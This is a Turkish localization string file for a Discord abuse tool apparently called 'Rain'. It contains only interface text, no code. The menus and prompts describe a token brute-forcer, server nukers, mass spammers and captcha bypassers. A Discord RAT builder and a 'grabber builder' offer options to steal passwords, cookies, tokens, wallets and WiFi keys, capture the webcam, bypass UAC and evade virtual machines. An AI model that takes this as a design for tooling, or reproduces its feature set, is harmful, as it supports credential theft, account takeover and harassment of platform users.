Token Bilgisi{end_space12}
Token Girişi{end_space14}
Token Yıkıcı{end_space13}
Token Kapıcısı{end_space11}
Token Devre Dışı Bırakıcı
Token Kaba Kuvvet{end_space8}
Sahte Yazıcı{end_space13}
Gurur Keskin Nişancısı{end_space3}
Grup Sohbeti Spamcısı{end_space4}
Arkadaş Engelleme{end_space8}
Arkadaşları Kaldırıcı{end_space9}
Arkadaşlık İstek Silici{end_space2}
Yeni Sunucular Oluştur{end_space3}
Profil Değiştirici{end_space7}
QR Kodu Kapıcısı{end_space9}
Discord Rat Botu{end_space9}
Düğme Basıcısı{end_space11}
Mesaj Reaktörü{end_space11}
Toplu Mesaj{end_space14}
Toplu Bildirim{end_space11}
Toplu Arkadaş{end_space12}
DM Silici{end_space16}
DM Temizleyici{end_space11}
Kural Atlatıcı{end_space11}
RestoreCord Atlatıcı{end_space5}
Sledge Hammer Atlatıcı{end_space3}
Webhook Aracı{end_space12}
Plingenn Yaptı{end_space11}
Değişiklik Günlüğü{end_space7}
Ayarlar{end_space18}
Sohbet
Tokenleri Yönet
Sonraki{end_space4}
Şu anda çalışıyor:{end_space6}
Geçersiz seçim, lütfen tekrar deneyin!
Kullanıcı tarafından kesildi.
Tema Değiştirici
Hesap Ayarları
Proxy Ayarları
Görünüm Ayarları
Hata Ayıklama Modu Geçişi
Yönetici Paneli
Geçersiz Ayar
SİYAH
MAVİ
YEŞİL
KIRMIZI
BEYAZ
SARI
MOR
AÇIK KIRMIZI
AÇIK MAVİ
AÇIK YEŞİL
AÇIK SİYAN
AÇIK SİYAH
Tema olarak ayarlandı
Hesap Genel Bakışı
Lisansım
Satın Alma Geçmişi
Kodu Kullan
Yazılımı İndir
Kullanıcı adı
Oluşturuldu
Kullanıcı Adı Değiştir
Çıkış yap
Kullanıcı adı değiştirilemedi, Kullanıcı adı en az 3 karakter içermelidir.
Hesabınızdan Çıkış yapmak istiyor musunuz? (E/H)
Ürün
Bitiş tarihi
Tarih
İçeriğinizi almak için ürün kodunuzu girin.
Kod
Kodu zaten kullandınız.
Giriş yapmadan önce ürününüzü kaydetmeyi unutmayın!
Yanıtta anahtar bulunamadı
Sağlanan kod için veri alınamadı
Kod bilgisinde URL bulunamadı
Geçersiz Kod!
Proxy Kullanımını Değiştir
Proxy Önbelleğini Temizle
Kendi Proxy'lerinizi Önbelleğe Ekle
Proxy Kazı
Geçersiz Seçim
Hata Ayıklama Modu Değiştirildi {KIRMIZI}KAPALI
Hata Ayıklama Modu Değiştirildi {YEŞİL}AÇIK
Yeni Kimlik Doğrulama Sistemi Eklendi
Yeniden Yapılandırma Sistemi İyileştirildi
Panel Arayüzü Yeniden Yapılandırıldı
Sohbet Sistemi Eklendi
Yeni hesap ayarları eklendi
Daha iyi performans için önbellekleme uygulandı
Özel Discord RPC
Discord RPC Kullanımını Değiştir
Özel Discord RPC Kullanımını Değiştir
Özel Discord RPC Düzenle
Özel Discord RPC Kullanımı KAPALI
Özel Discord RPC Kullanımı AÇIK
Ayrıntılar (Gerekli)
Ayrıntılar en az 3 karakter uzunluğunda olmalıdır.
Durum (Gerekli)
Durum en az 3 karakter uzunluğunda olmalıdır.
Büyük resim URL'si (İsteğe bağlı)
Büyük metin (İsteğe bağlı)
Küçük resim URL'si (İsteğe bağlı)
Küçük metin (İsteğe bağlı)
Kaç düğme istersiniz?
Düğme için etiket girin
Düğme için URL girin
Geçersiz URL biçimi. Lütfen geçerli bir URL girin.
Geçersiz düğme sayısı. Lütfen 0 ile 2 arasında bir sayı girin.
Discord RPC KAPALI olarak değiştirildi
Discord RPC AÇIK olarak değiştirildi
Normal Mod
RestoreCord Modu (captcha atlatma)
Önbellek Kontrolü
Özel Kontrol
Sunucu Kontrolü
Token yüklemek için özel yolunuzu girin
Normal Sohbet
Destek Sohbeti (Uygun değil)
Özel Sohbet (Uygun değil)
Sunucu Arama{end_space13}
Sunucu Klonlayıcı{end_space8}
Sunucu Yok Ettirici{end_space6}
Token Birleştirici{end_space7}
Token Ayrımcı{end_space12}
Token Spamcı{end_space13}
Nöbet Tutma{end_space14}
Ses Kartı Spamcısı{end_space7}
Sesli Sohbet Katılımcısı{end_space1}
Profil Resmi Değiştirici{end_space5}
Genel Takma Ad Değişimci{end_space1}
Sunucu Takma Adı Değiştirici
HypeSquad Değiştirici{end_space4}
Zamirler Değiştirici{end_space5}
Dil Değiştirici{end_space10}
Durum Değiştirici{end_space8}
Tema Değiştirici{end_space9}
Biyografi Değiştirici{end_space4}
Hesap Oluşturucu{end_space9}
VideoÇökme Yapıcı{end_space8}
Ayarlar Döngüsü{end_space14}
Güncelleme Notları{end_space7}
Telegram{end_space17}
Selfbot{end_space18}
Github{end_space19}
Hakkında{end_space17}
Çıkış{end_space20}
Önceki Sayfa{end_space3}
Sunucu Adları
Mesaj
Konu Sayısı
Bir hata oluştu:
Önbellekte hiçbir token bulunamadı
Rain Nuke dağıtılıyor
Rain Nuke başarıyla dağıtıldı...
Mesaj Gönderme
Mesaj ID'si:
Tüm mevcut arkadaşlara mesaj gönderildi.
Sunucudan ayrıldı:
Sunucu silindi:
Aşağıdaki hata ile karşılaşıldı ve görmezden geliniyor:
Tüm mevcut sunucular silindi/ayrıldı.
Arkadaşı Kaldırma:
Arkadaş Kaldırıldı:
Tüm mevcut arkadaşlar kaldırıldı.
Oluşturuluyor
Oluşturuldu
Tüm sunucular oluşturuldu.
Rain Nuke başarıyla patlatıldı!
Başarıyla Reme Çölü'ne dönüştü
Devam etmek için bir şeyler girin...
Nöbet modu başlatılıyor (Aydınlık/karanlık modu açma/kapama)
Devam etmek için yeterli arkadaş yok.
Token işlenirken bir hata oluştu
Kanal Spamcısı
Kanal Kimliği
Kuralları Atla
Sunucu Kimliği
Sahte Yazıcı Token
Genel Takma Ad Değiştirici
Takma Ad
Sunucu Takma Ad Değiştirici
Zamirler Değiştirici
Rastgele Zamirler (e/h)
Zamirler
Silinen DM:
Devam etmek için yeterli DM yok.
Döngü kesildi
Ses Kartı Spamcısı
Kullanıcı tarafından program kesildi.
Token ile kalp atışı gönderilemedi:
Token ile sesli sohbete katılınamadı:
Token'lerle sesli sohbete katılıyor...
Davet başarıyla güncellendi, sunucunuz artık erişilebilir
Vanity URL'si güncellenemedi. Durum kodu:
Nişan almak için Vanity kodu
Vanity uygulanacak sunucu ID'si
Kontroller arası gecikme (saniye)
Vanity Kesicisi başlatıldı. Durdurmak için Ctrl+C'ye basın.
Hata:
Webhook Spammer
Webhook Silici
Webhook
Webhook başarıyla silindi
Token Yöneticisi
Tokenları Kaydet
Tokenları Temizle
Tokenları Kontrol Et ve Sadece Geçerli Olanları Kaydet (e/h)
Token Önbelleği Boşaltıldı.
Tokenları içeren metin dosyasının yolunu girin
Belirtilen metin dosyasında token bulunamadı
Token Kontrolcüsü
Sunucu adı alınamadı:
Katılıyor
Yağmur token kaba kuvvet. Not: Bu uzun bir süre alabilir.
Eğer çok şanslıysanız ve birinin token'ını almayı başarırsanız, bunu 'brute-force.txt' içinde bulacaksınız.
Bir kişinin hesabında brute force saldırısı yapmadan önce her zaman açık izin alın.
Geçersiz kullanıcı kimliği, lütfen yeniden deneyin!
GEÇERLİ
GEÇERSİZ
Faturalama kaynakları alınamıyor:
Nitro verileri alınamıyor:
Fatura bilgisi bulunamadı.
Kullanıcı bilgileri ve sürücüler toplanıyor..
Dosya Adı
Dosya Şifresi
İkon dosyası sağlamak ister misiniz? (E/H)
Geçersiz ikon yol veya URL. İkon ayarı yapılmadı.
Beni Pingle (E/H)
Anti VM (E/H)
Başlangıçta Başlat (E/H)
UAC Atlatma (E/H)
Erit (E/H)
Konsolu Gizle (E/H)
Web kamerasını Yakala (E/H)
Şifreleri Yakala (E/H)
Çerezleri Yakala (E/H)
Otomatik Dolduruları Yakala (E/H)
Geçmişi Yakala (E/H)
Discord Token'larını Yakala (E/H)
Oyunları Yakala (E/H)
WiFi Şifrelerini Yakala (E/H)
Sistem Bilgisini Yakala (E/H)
Ekran Görüntüsü Yakala (E/H)
Telegram'ı Yakala (E/H)
Ortak Dosyaları Yakala (E/H)
Cüzdanları Yakala (E/H)
Sahte Hata (E/H)
Sahte Hata Başlığı
Sahte Hata Mesajı
Av Sitesini Engelle (E/H)
Discord Enjeksiyonu (E/H)
Dosya İkonu
{isim}.exe oluşturuluyor, Bu birkaç saniye sürebilir. Sabrınız için teşekkürler!
Dosya 'output/grabberbuilder/{isim}.exe konumuna alındı.
Grup sohbeti oluşturuldu
Sınırlandırılmış oran ({response.json()['retry_after']}ms)
Rastgele seçim için yeterli arkadaş yok
Grup sohbeti spamı için kullanıcıları kendiniz mi seçmek istersiniz yoksa rastgele mi seçmek istersiniz?
Kullanıcıları kendiniz seçin
Kullanıcıları rastgele seçin
Grup sohbetleri oluşturuluyor
Kullanıcı kimlikleri
Virgül (,) yoktu, biçim id,id2,id3
herhangi bir zamanda durdurmak için
Engellendi:
İlişkiler alınamadı:
Devam etmek için yeterli arkadaşlık isteği yok.
Gelen Arkadaşlık İsteği:
Arkadaşlık İsteği Kaldırıldı:
Toplam Arkadaşlık İsteği Kaldırıldı:
{server_name} oluşturulurken bir hata oluştu: {e}
sunucu simgeleri evet/hayır
Rastgele sunucu adları
Özel sunucu adları
Oluşturulacak sunucuların adı
Lütfen ikon konumunu girin
Bilgisayarınızda "{image}" bulunamadı
Özel Durum
Özel Biyografi
Dosya Oluşturuluyor... {i}
Dosya Yazılıyor... {i}
Not: Bu kod şu anda tam olarak çalışır durumda değil, ancak çalıştırılabilir.\nAncak, hatalar veya hatalarla karşılaşabilirsiniz.
Son dosyaya vermek istediğiniz adı girin
RAT komutlarını çalıştırmak için kullanacağınız botun belirteci
Bot belirteci
Kesme komutları kayıtlı olan guild ID'sini girin
Dosya yazma hatası: {e}
Dosya doğru şekilde "output/{dosyaAdı}.py" konumuna yazıldı
Komut dosyanızı yürütülebilir bir dosyaya dönüştürün (E/H)
Dosya oluşturuluyor...
Eski dosyalar temizleniyor...
Yürütülebilir dosya doğru şekilde oluşturuldu
HTTP hatası oluştu: {e}
Mesaj kimliği
Basmak istediğiniz düğmeyi seçin
{r}({LIGHTBLACK_EX}{i}{r}) Ad: {LIGHTBLACK_EX}{düğme_etiketi}{r}, Özel Kimlik: {LIGHTBLACK_EX}{düğme_özel_kimliği}
Düğme
Mesajda yalnızca bir düğme bulundu.
Tepki {reaction} mesajına ekleme başarısız oldu {message_id}. Zaten maksimum tepki sayısına ulaşıldı.
Zaten maksimum tepki sayısına ulaşıldı.
Tepki {reaction} mesajına ekleme başarısız oldu {message_id}. Yasaklanmış: {error_message}
Nesneler
Yüzler
Hayvanlar
Semboller
Yanıtta emoji bulunamadı
API'den emoji alınamadı
Davet bağlantısı
Geçersiz davet bağlantısı biçimi
Talep gönderilirken bir hata oluştu
Davet Bilgileri:
Davet Eden Bilgileri:
Sunucu Bilgileri:
Kanal
Süresi Dolma Tarihi
Kullanıcı Kimliği
Rozetler
Uygun değil
İsim
Sunucu Kimliği
Açıklama
Banner
Banner URL'si
Banner URL'si (Uygun değil)
Hayal URL'si
Doğrulama Seviyesi
Sıçrama
Sıçrama URL'si
Sıçrama URL'si (Uygun değil)
Özellikler
Nöbet Başladı. Durdurmak için Ctrl+C'ye basın.
Nöbet kesildi
Dil döngüsü başladı. Durdurmak için Ctrl+C'ye basın.
Geçersiz Token.
Devam etmek için ENTER tuşuna basın
Discord API Aracı | https://Rain.xyz | Plingenn tarafından yapıldı
Görünüm Ayarları
Metin Ayarları
İmleç Ayarları
Şeffaflık Ayarları
Pencere Ayarları
Dil Ayarları
Renk Düzeni
Yazı Tipi
Yazı Boyutu
Satır Yüksekliği
Yazı Kalınlığı
Retro Terminal Efektleri
Renk Ayarları
Yazı Tipi Ayarları
Yazı Boyutu Ayarları
Satır Yüksekliği Ayarları
Yazı Kalınlığı Ayarları
Retro Ayarları
İmleç Ayarları
Dil şu dil olarak ayarlandı: {chosen_language}
İsimsiz
Tür
Ev
Mesaj bağlantısı
Geçersiz mesaj bağlantısı
Geri Dön...
Discord RPC'ye bağlanılamadı: {e}
Seçenek
Tema
Ayar
Düzenle
Dil
Panel Opaklığı
Geçersiz Opaklık
Pencere Ayarları
Bu Seçenek Devam Ediyor
Bu seçenek şu anda kullanılamıyor. Daha sonra eklenmesi için lütfen sabırlı olun.
Bu seçenek şu anda kullanılamıyor.
Yakında şu ile değiştirilecek: '{replacement}'.
Bu Seçenek Mevcut Değil
Bu seçenekler şu anda geliştirme aşamasında
Bu seçenekler şu anda geliştirme aşamasında olup kullanılabilir durumdadır. Ancak, hatalar veya hatalar oluşabilir.
{pronounce_url}'den zamirler alınamadı ({statuscode})
Vekil kullanımı şu anda kullanılamıyor. Herhangi bir rahatsızlık için özür dileriz. Yaklaşan güncellemelerden birinde erişilebilir hale getirilecektir.
Vekil Kullanımı Kapalı {RED}KAPALI
Vekil Kullanımı Açık {GREEN}AÇIK
Yeni Vekiller Başarıyla Yazıldı
Başarıyla Vekil Alındı
Tamamlandı! Toplamda {proxies} vekil alındı => {temp} | {execution_time}ms
PC{end_space5}
Çoklu dil desteği uygulandı.
Toplu Başlık{end_space13}
Forum Spamcısı
Kullanıcılara Toplu DM{end_space3}
Uygulanamaz{end_space14}
Sunucu Artırıcı{end_space15}
Token Çevrimiçi Kullanıcı
Anket Oluşturucu{end_space9}